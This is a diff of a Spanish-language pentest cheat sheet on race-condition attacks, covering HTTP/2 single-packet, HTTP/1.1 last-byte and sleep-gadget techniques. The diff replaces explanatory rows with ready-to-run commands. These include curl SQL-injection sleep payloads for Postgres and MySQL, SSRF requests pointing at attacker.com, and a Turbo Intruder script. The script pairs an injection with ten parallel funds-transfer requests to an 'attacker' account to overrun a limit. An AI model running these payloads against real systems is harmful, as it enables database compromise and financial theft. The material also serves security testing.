@@ -23,16 +23,12 @@ linked:
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Concepto | HTTP/2 multiplexes streams en un solo TCP packet. N requests llegan al server simultáneamente — bypassea network jitter. | James Kettle 2023 paper. |
-| Setup | Cliente HTTP/2 + server con HTTP/2 support | Cloudflare/AWS ALB típicamente. |
-| Última frame coordinada | Mandar headers de N requests → hold last DATA frame → flush all juntos | Single-packet sync. |
-| Turbo Intruder support | Built-in flag `engine=Engine.BURP2` o `concurrentConnections=1` | Tool nativo. |
-| Resultado | Window de ms → all N requests procesados quasi-simultáneamente | Race window minimal. |
-| Limitación | Solo HTTP/2 endpoints | Si server H1 only → fallback. |
-| Validation | Latency baseline vs concurrent run | Si concurrent latency ~= 1 request → packet único. |
-| Burp Repeater H2 mode | "Send group → in single connection" + tab "HTTP/2" | UI alternative. |
-| Sleep gadget canary | Inject sleep 5s en single request, race gate antes que sleep complete | Confirm window. |
-| Best for | Limit overrun, OTP brute, state machine race | Most common usage. |
+| Burp Repeater → tab HTTP/2 → group requests → "Send group in parallel (single connection)" | Multiplex HTTP/2 streams en single TCP packet | Endpoint con HTTP/2. |
+| Turbo Intruder script con `engine=Engine.BURP2, concurrentConnections=1` (ver code block) | HTTP/2 single-packet automation | Volume race testing. |
+| `curlc --http2 -X POST -d '{"k":"v"}' https://target/api/x` × N en parallel via background subshell | Manual H2 test | Quick CLI variant. |
+| `curl -sI https://target -o /dev/null -w '%{http_version}\n'` | Verifica si endpoint usa HTTP/2 | Pre-attack check. |
+| Post-race: comparar latencia 1 request vs N concurrent | Si latencia ~igual → packet único confirmado | Validation. |
+| Sleep gadget canary: inject `?q=' OR pg_sleep(5)-- -` en single request, race antes de sleep complete | Confirma race window enlarged | Side-channel timing test. |
 ^race-single-h2
 
 ### Turbo Intruder script HTTP/2 single-packet
@@ -64,16 +60,11 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Concepto | HTTP/1.1 sin H2 — pre-load todos los requests excepto last byte, luego flush último byte de cada uno juntos | Pre-H2 técnica. |
-| Pipelining + delay | Send headers + N-1 bytes del body → hold last byte → flush juntos | Manual. |
-| Connection reuse | Single TCP connection con pipelining | RFC 2616. |
-| Limitación | Server debe soportar pipelining (HTTP/1.1 keep-alive) | Most do. |
-| Server processing | Server holds requests hasta complete | Que no cierre conn. |
-| Network jitter | Bytes flush juntos → minimiza jitter | Vs network-level race. |
-| Tooling | Turbo Intruder con `engine=Engine.THREADED` + custom timing | Implementable. |
-| Burp Repeater | "Send group → single connection" funciona aproximadamente | Less precise. |
-| Best for | Targets HTTP/1.1 only, internal apps, legacy | Legacy. |
-| Modern alternative | Si target tiene H2 → preferir H2 single-packet | Better timing. |
+| Turbo Intruder con `engine=Engine.THREADED, concurrentConnections=1` y manual byte-flush | Last-byte sync HTTP/1.1 | Endpoint H1 only. |
+| Burp Repeater group "Send in single connection" sin H2 | Pipelining manual approximado | Less precise que H2. |
+| `curl --http1.1 -X POST ...` × N pipelined en single conn (custom script) | Manual H1 race | Legacy targets. |
+| `curl -sI https://target \| grep -i 'HTTP/'` | Verificar version HTTP soportada | Discovery. |
+| Comparar `time` de 1 request vs N concurrent | Detectar race timing window | Calibration. |
 ^race-single-lastbyte
 
 ___
@@ -82,16 +73,12 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Concepto | Pre-warm server (caches, connections, JIT) antes del race burst | Reduce variability. |
-| Warm cache | Send 1 normal request antes → cache populated | Más predictable. |
-| Establish TLS | TLS handshake antes del burst | Reduce jitter. |
-| Pool DB connections | Trigger DB lookup antes → connection in pool | Backend pre-warm. |
-| Burp option "Pre-warm connection" | Built-in en Turbo Intruder | Auto. |
-| Sleep buffer | Wait 100ms entre warm y burst | Network stability. |
-| Multi-stage | Warm in stage 1 + race in stage 2 | Phased. |
-| Cold start avoid | Si serverless (Lambda) → invoke once before | Avoid cold start. |
-| TCP slow start avoid | TCP cwnd grow → mejor con keep-alive | Network. |
-| TLS session reuse | TLS resume reduces handshake | Speed. |
+| Send 1 GET request "warm" antes del burst | Pre-warm caches + DB connections | Reduce jitter. |
+| `curl -sI https://target/x > /dev/null && sleep 0.1 && [BURST]` | Sleep buffer entre warm y burst | Network stability. |
+| Turbo Intruder script con `engine.queue(warmup_req); engine.queue(real_req)` × N | Phased warm + race | Built-in. |
+| `for i in {1..3}; do curl -sI https://target/api/x > /dev/null; done; sleep 0.5; [parallel burst]` | Triple warm + delay | Cold start avoidance. |
+| Si serverless (Lambda): `curl https://target/init` antes del race | Force cold start handling | Lambda apps. |
+| TLS session resumption: usar mismo curl session con `--cookie-jar /tmp/c -b /tmp/c` | TLS reuse reduce handshake time | Connection-level prep. |
 ^race-single-prewarm
 
 ___
@@ -100,16 +87,12 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Concepto | Si no estás seguro de race window — inject sleep en endpoint via SQLi/SSRF/etc. Sleep extiende processing time → race window enlargada artificialmente | Side-channel. |
-| SQLi sleep | `' OR pg_sleep(5) -- -` en arg vulnerable | Postgres. |
-| SQLi MySQL | `' OR SLEEP(5) -- -` | MySQL. |
-| SSRF sleep | SSRF a slow endpoint propio | Custom. |
-| External fetch sleep | App fetch external URL → atacante sirve slow response | Tarpit. |
-| File operation sleep | Upload large file → processing slow | Inherent. |
-| Image resize sleep | Big image triggers slow resize | Same. |
-| Confirm race exists | Sin sleep gadget no race observed → con sleep race confirmed | Validates timing-sensitivity. |
-| Tunear timing window | Adjust sleep duration → identify min window required | Calibration. |
-| Race condition development | Develop race exploit con large window first → minify después | Iterative. |
+| `curl "https://target/search?q=A%27%20OR%20pg_sleep(5)--%20-"` | SQLi sleep en Postgres → enlarge race window | Postgres backend. |
+| `curl "https://target/search?q=A%27%20OR%20SLEEP(5)--%20-"` | SQLi sleep en MySQL | MySQL backend. |
+| `curl "https://target/api/url?fetch=https://attacker.com/slow"` (atacante sirve slow response) | SSRF sleep gadget | App con SSRF + outbound. |
+| `curl "https://target/api/url?fetch=http://attacker.com:81"` (port no-respondiendo) | Timeout-based sleep | Connection-level delay. |
+| Upload archivo grande (1GB) en endpoint upload → race trigger en otra parallel request | Inherent sleep via processing | Heavy file upload race. |
+| Trigger image resize endpoint con large image | Image processing sleep | Resize pipeline race. |
 ^race-single-sleep
 
 ### Workflow combine sleep gadget + race
@@ -119,20 +102,19 @@ ___
 def queueRequests(target, wordlists):
     engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=1, engine=Engine.BURP2)
 
-    # Request 1: trigger sleep via SQLi en endpoint vulnerable
+    # Trigger sleep via SQLi
     sleep_req = '''GET /search?q=AAA' OR pg_sleep(5)-- - HTTP/2
 host: target.com
 
 '''
     
-    # Request 2: race con limit overrun
+    # Race con limit overrun
     race_req = '''POST /api/transfer HTTP/2
 host: target.com
 content-type: application/json
 
 {"to":"attacker","amount":1000}'''
     
-    # Send sleep first → race during sleep window
     engine.queue(sleep_req)
     for _ in range(10):
         engine.queue(race_req)
